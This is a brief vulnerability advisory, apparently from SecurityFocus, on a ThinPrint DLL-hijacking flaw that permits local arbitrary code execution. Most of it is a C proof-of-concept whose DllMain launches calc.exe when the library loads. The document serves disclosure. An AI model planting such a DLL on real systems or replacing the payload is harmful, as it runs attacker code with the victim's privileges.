source: http://www.securityfocus.com/bid/55421/info

ThinPrint is prone to a vulnerability that lets attackers execute arbitrary code.

Exploiting this issue allows local attackers to execute arbitrary code with the privileges of the user running the affected application. 

#include <windows.h> 

	int hijack_poc () 
	{ 
	  WinExec ( "calc.exe" , SW_NORMAL );
	  return 0 ; 
	} 
	  
	BOOL WINAPI DllMain 
		 (	HINSTANCE hinstDLL , 
			DWORD dwReason ,
			LPVOID lpvReserved ) 
	{ 
	  hijack_poc () ;
	  return 0 ;
	} 